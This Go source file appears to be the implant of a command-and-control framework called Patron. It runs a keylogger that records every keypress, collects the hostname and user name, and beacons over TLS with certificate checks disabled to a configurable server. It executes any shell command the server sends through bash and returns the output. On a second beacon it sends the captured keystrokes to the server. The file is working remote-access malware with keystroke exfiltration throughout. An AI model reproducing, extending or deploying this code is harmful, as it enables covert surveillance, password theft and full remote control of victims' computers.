package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/MarinX/keylogger"
	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

const rootCert = `-----BEGIN CERTIFICATE-----
MIICXzCCAgWgAwIBAgIUMd+ZlvsLMPMqJxWJ9T6BJGthj9gwCgYIKoZIzj0EAwIw
gYQxCzAJBgNVBAYTAlVTMREwDwYDVQQIDAhNYXJ5bGFuZDEPMA0GA1UEBwwGVG93
c29uMREwDwYDVQQKDAhQYXRyb25DMjELMAkGA1UECwwCQzIxDzANBgNVBAMMBnBh
dHJvbjEgMB4GCSqGSIb3DQEJARYRcGF0cm9uQHBhdHJvbi5jb20wHhcNMjIwNTA0
MjEzNDIzWhcNMzIwNTAxMjEzNDIzWjCBhDELMAkGA1UEBhMCVVMxETAPBgNVBAgM
CE1hcnlsYW5kMQ8wDQYDVQQHDAZUb3dzb24xETAPBgNVBAoMCFBhdHJvbkMyMQsw
CQYDVQQLDAJDMjEPMA0GA1UEAwwGcGF0cm9uMSAwHgYJKoZIhvcNAQkBFhFwYXRy
b25AcGF0cm9uLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABEA0e3xutzlG
NonmwcaQcwYyaqKHG2ZFqDeB30vXhAwQjK/n9rRSA+THI5FsdNdk3wiJlJkKV1QR
0yYb4J1aFg2jUzBRMB0GA1UdDgQWBBTLaFpt8fmieqkXwXdS2oi9R29hhzAfBgNV
HSMEGDAWgBTLaFpt8fmieqkXwXdS2oi9R29hhzAPBgNVHRMBAf8EBTADAQH/MAoG
CCqGSM49BAMCA0gAMEUCIF/HZD1/d01Q3Dk/gpvGQObYnx6JNrupJehaYKjQ+N4B
AiEAli42Gt6ELWRZ1/0aXz8t63CI8o9mfp4rloqjcF/Dq10=
-----END CERTIFICATE-----
`

// func exec_command(text string) {

// }

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
)

func main() {
	// if ServerIP == "" {

	// }
	// Load public cert for encrypted comms
	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(rootCert))
	if !ok {
		log.Fatal("failed to parse root certificate")
	}
	config := &tls.Config{RootCAs: roots, InsecureSkipVerify: true}

	//Keylog start
	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()
	cache := "" // cache for keylogs
	k, err := keylogger.New(keyboard)
	if err != nil {
		log.Fatalln(err)
		return
	}
	defer k.Close()

	events := k.Read()

	go func() {
		// range of events
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:

				// if the state of key is pressed
				if e.KeyPress() {
					// fmt.Println("[event] press key ", e.KeyString())
					cache = cache + e.KeyString()
				}

				// if the state of key is released
				if e.KeyRelease() {
					// fmt.Println("[event] release key ", e.KeyString())
					cache = cache + e.KeyString()
				}

				break
			}
		}
	}()

	Agentuuid := uuid.New().String()                         // Agent's uuid generated
	hostname, err := exec.Command("hostname", "-f").Output() // Agent's hostname
	if err != nil {
		log.Fatal(err)
	}
	user, err := exec.Command("whoami").Output() // Agent's Username

	for {
		//First beacon for reqular commands
	RETRY:
		beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
		if err != nil {
			// log.Fatalln(err) // maybe try diff IP
			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
			goto RETRY
		}
		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
		ip := fmt.Sprintf("%v", ipAddress)
		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter
		// logger.Logf(logger.Debug, "Sending : %s\n", init)
		_, _ = beacon.Write([]byte(init + "\n"))
		dec := gob.NewDecoder(beacon)
		encoder := gob.NewEncoder(beacon)
		logger.Logf(logger.Info, "Server Connected\n")
		instruct := &types.GiveAgentCommand{}
		logger.Logf(logger.Debug, "Struct formed\n")
		err = dec.Decode(instruct)
		if err != nil {
			log.Fatalln(err)
		}

		logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
		// Update agent config when possible
		if instruct.UpdateAgentConfig.CallbackTo != "" {
			glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
			ServerIP = glob[0]
			ServerPort = glob[1]
		}
		if instruct.UpdateAgentConfig.CallbackFrequency != "" {
			CallbackFrequency = instruct.UpdateAgentConfig.CallbackFrequency
		}
		if instruct.UpdateAgentConfig.CallbackJitter != "" {
			CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
		}
		logger.Logf(logger.Debug, "Received : %s\n", instruct)
		CommandType := instruct.CommandType
		Command := instruct.Command
		CmdOut := ""
		destruct := types.GiveServerResult{}
		if CommandType == "shell" && Command != "" {
			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
			var c *exec.Cmd
			c = exec.Command("bash", "-c", Command)
			buf, _ := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "1",
				Output:      CmdOut,
				CommandUUID: instruct.CommandUUID,
			}
		} else if CommandType == "update" {
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "1",
				Output:      "Success",
				CommandUUID: instruct.CommandUUID,
			}
		} else { // if CommandType == ""
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "2", // meaning nothing to run
				Output:      "",
				CommandUUID: instruct.CommandUUID,
			}
		}

		err = encoder.Encode(destruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Sent encoded struct\n")
		beacon.Close()
		intVar, err := strconv.Atoi(CallbackFrequency)  // apply CallbackFrequency
		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here

		//Second beacon for keylog dump
	KEYRETRY:
		keybeacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
		if err != nil {
			// log.Fatalln(err) // maybe try diff IP
			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
			goto KEYRETRY
		}
		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
		keyip := fmt.Sprintf("%v", keyipAddress)
		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter
		// logger.Logf(logger.Debug, "Sending : %s\n", init)
		_, _ = keybeacon.Write([]byte(keyinit + "\n"))
		keydec := gob.NewDecoder(keybeacon)
		keyencoder := gob.NewEncoder(keybeacon)
		logger.Logf(logger.Info, "Server Connected\n")
		keyinstruct := &types.KeySend{}
		logger.Logf(logger.Debug, "Struct formed\n")
		err = keydec.Decode(keyinstruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
		Keydestruct := types.KeyReceive{}
		Keydestruct = types.KeyReceive{
			Uuid: keyinstruct.Uuid,
			Keys: cache,
		}
		cache = "" //Clears cache after keylog dump

		err = keyencoder.Encode(Keydestruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Sent encoded struct\n")
		keybeacon.Close()
		time.Sleep(time.Second * time.Duration(intVar)) // interval and jitter here
	}

}
